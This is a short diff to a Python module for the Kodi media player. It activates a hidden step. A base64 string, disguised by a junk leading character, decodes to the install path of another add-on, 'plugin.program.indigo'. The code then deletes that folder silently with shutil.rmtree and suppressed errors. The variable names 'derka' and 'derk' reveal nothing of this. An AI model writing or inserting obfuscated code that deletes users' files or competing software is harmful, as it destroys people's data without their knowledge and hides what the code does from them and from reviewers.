@@ -13,6 +13,6 @@ import shutil
 import xbmc  # pylint: disable=import-error
 
 derka = 'Xc3BlY2lhbDovL2hvbWUvYWRkb25zL3BsdWdpbi5wcm9ncmFtLmluZGlnbw=='[1:].decode('base64')
-derk = xbmc.translatePath(()).decode('utf-8')
+derk = xbmc.translatePath((derka)).decode('utf-8')
 
 shutil.rmtree(derk, ignore_errors=True)
